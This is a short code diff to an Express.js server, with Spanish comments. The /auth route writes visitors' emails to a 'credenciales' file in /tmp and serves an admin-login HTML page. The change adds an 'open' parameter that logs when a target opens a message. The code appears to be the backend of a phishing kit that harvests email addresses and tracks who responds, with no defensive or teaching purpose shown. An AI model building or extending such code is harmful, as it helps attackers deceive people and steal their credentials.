@@ -17,12 +17,22 @@ app.use(
 
 app.get("/auth", (req, res) => {
   const email = req.query.email || "";
+  const open = req.query.open || "";
 
-  // Guardar credenciales en archivo
-  const credenciales = `Email: ${email} | Mail \n`;
-  
-// Aquí podrías guardarlo si quieres
-  fs.appendFileSync(path.join("/tmp", "credenciales.txt"), credenciales);
+  if (email) {
+    // Guardar credenciales en archivo
+    const credenciales = `Email: ${email} | Mail \n`;
+
+    // Aquí podrías guardarlo si quieres
+    fs.appendFileSync(path.join("/tmp", "credenciales.txt"), credenciales);
+  }
+  if (open) {
+    // Guardar credenciales en archivo
+    const credenciales = `EmailOpen: ${email} | Mail \n`;
+
+    // Aquí podrías guardarlo si quieres
+    fs.appendFileSync(path.join("/tmp", "credenciales.txt"), credenciales);
+  }
 
   const filePath = path.join(__dirname, "edradminlogin.html");
   res.sendFile(filePath);
